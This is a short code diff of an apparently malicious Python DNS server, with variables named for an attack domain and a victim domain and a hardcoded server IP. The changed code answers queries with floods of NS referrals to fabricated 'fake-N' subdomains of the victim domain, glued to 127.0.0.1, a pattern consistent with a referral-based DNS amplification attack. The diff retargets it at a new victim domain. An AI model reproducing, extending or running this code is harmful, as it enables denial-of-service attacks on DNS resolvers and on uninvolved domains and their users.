@@ -26,7 +26,7 @@ class DomainName(str):
 
 
 attack_domain = DomainName('securekey.app.')
-victim_domain = DomainName('securekey.app.')
+victim_domain = DomainName('findall.app.')
 IP = '67.205.178.106'
 IP2 = '127.0.0.1'
 TTL = 30
@@ -83,7 +83,7 @@ def dns_response(data, client_ip):
         val = 0  # random.choice([0, 1])
         if val == 0:
             for rdata in referral_responses:
-                reply.add_auth(RR(rname=attack_domain, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
+                reply.add_auth(RR(rname=DomainName(qn), rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
                 referral_domain = DomainName('fake-' + str(i) + '.' + victim_domain)
                 reply.add_ar(RR(rname=referral_domain, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP2)))
         else:
